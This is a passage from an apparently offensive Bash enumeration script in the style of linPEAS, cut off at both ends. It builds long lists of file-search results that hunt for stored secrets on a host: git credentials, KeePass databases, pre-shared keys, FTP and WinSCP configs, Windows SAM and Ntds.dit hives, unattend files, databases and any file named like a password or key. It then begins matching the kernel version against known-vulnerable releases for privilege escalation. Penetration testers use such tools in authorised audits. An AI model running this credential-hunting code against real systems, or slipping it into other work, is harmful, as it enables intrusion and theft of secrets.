  PSTORAGE_LDAPRC=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.ldaprc$" | sort | uniq | head -n 70)
  PSTORAGE_ENV=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.env$" | sort | uniq | head -n 70)
  PSTORAGE_MSMTPRC=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.msmtprc$" | sort | uniq | head -n 70)
  PSTORAGE_INFLUXDB=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "influxdb\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_ZABBIX=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "zabbix_server\.conf$|zabbix_agentd\.conf$|zabbix$" | sort | uniq | head -n 70)
  PSTORAGE_GITHUB=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.github$|\.gitconfig$|\.git-credentials$|\.git$" | sort | uniq | head -n 70)
  PSTORAGE_SVN=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.svn$" | sort | uniq | head -n 70)
  PSTORAGE_KEEPASS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*\.kdbx$|KeePass\.config.*$|KeePass\.ini$|KeePass\.enforced.*$" | sort | uniq | head -n 70)
  PSTORAGE_PRE_SHARED_KEYS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*\.psk$" | sort | uniq | head -n 70)
  PSTORAGE_PASS_STORE_DIRECTORIES=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.password-store$" | sort | uniq | head -n 70)
  PSTORAGE_FTP=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*\.ftpconfig$|ffftp\.ini$|ftp\.ini$|ftp\.config$|sites\.ini$|wcx_ftp\.ini$|winscp\.ini$|ws_ftp\.ini$" | sort | uniq | head -n 70)
  PSTORAGE_BIND=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/usr|^/etc|^/var" | grep -E "bind$" | sort | uniq | head -n 70)
  PSTORAGE_SEEDDMS=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "seeddms.*$" | sort | uniq | head -n 70)
  PSTORAGE_DDCLIENT=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "ddclient\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_KCPASSWORD=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "kcpassword$" | sort | uniq | head -n 70)
  PSTORAGE_SENTRY=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "sentry$|sentry\.conf\.py$" | sort | uniq | head -n 70)
  PSTORAGE_STRAPI=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "environments$" | sort | uniq | head -n 70)
  PSTORAGE_CACTI=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "cacti$" | sort | uniq | head -n 70)
  PSTORAGE_ROUNDCUBE=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "roundcube$" | sort | uniq | head -n 70)
  PSTORAGE_PASSBOLT=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "passbolt\.php$" | sort | uniq | head -n 70)
  PSTORAGE_JETTY=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "jetty-realm\.properties$" | sort | uniq | head -n 70)
  PSTORAGE_WGET=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.wgetrc$" | sort | uniq | head -n 70)
  PSTORAGE_INTERESTING_LOGS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "access\.log$|error\.log$" | sort | uniq | head -n 70)
  PSTORAGE_OTHER_INTERESTING=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.bashrc$|\.google_authenticator$|hosts\.equiv$|\.lesshst$|\.plan$|\.profile$|\.recently-used\.xbel$|\.rhosts$|\.sudo_as_admin_successful$" | sort | uniq | head -n 70)
  PSTORAGE_WINDOWS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "unattend\.inf$|.*\.rdg$|AppEvent\.Evt$|ConsoleHost_history\.txt$|FreeSSHDservice\.ini$|NetSetup\.log$|Ntds\.dit$|protecteduserkey\.bin$|RDCMan\.settings$|SAM$|SYSTEM$|SecEvent\.Evt$|appcmd\.exe$|bash\.exe$|datasources\.xml$|default\.sav$|drives\.xml$|groups\.xml$|https-xampp\.conf$|https\.conf$|iis6\.log$|index\.dat$|my\.cnf$|my\.ini$|ntuser\.dat$|pagefile\.sys$|printers\.xml$|recentservers\.xml$|scclient\.exe$|scheduledtasks\.xml$|security\.sav$|server\.xml$|setupinfo$|setupinfo\.bak$|sitemanager\.xml$|sites\.ini$|software$|software\.sav$|sysprep\.inf$|sysprep\.xml$|system\.sav$|unattend\.txt$|unattend\.xml$|unattended\.xml$|wcx_ftp\.ini$|ws_ftp\.ini$|web.*\.config$|winscp\.ini$|wsl\.exe$" | sort | uniq | head -n 70)
  PSTORAGE_DATABASE=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/man/|/usr/|/var/cache/' | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*\.db$|.*\.sqlite$|.*\.sqlite3$" | sort | uniq | head -n 70)
  PSTORAGE_BACKUPS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "backup$|backups$" | sort | uniq | head -n 70)
  PSTORAGE_PASSWORD_FILES=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*password.*$|.*credential.*$|creds.*$|.*\.key$" | sort | uniq | head -n 70)

  backup_folders_row="$(echo $PSTORAGE_BACKUPS | tr '\n' ' ')"
  printf ${YELLOW}"DONE\n"$NC
  echo ""
fi













if echo $CHECKS | grep -q system_information; then
print_title "System Information"

print_2title "Operative system"
print_info ";pr1v 3sc"
(cat /proc/version || uname -a ) 2>/dev/null | sed -${E} "s,$kernelDCW_Ubuntu_Precise_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_5,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_6,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Xenial,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_3,${SED_RED_YELLOW}," | sed -${E} 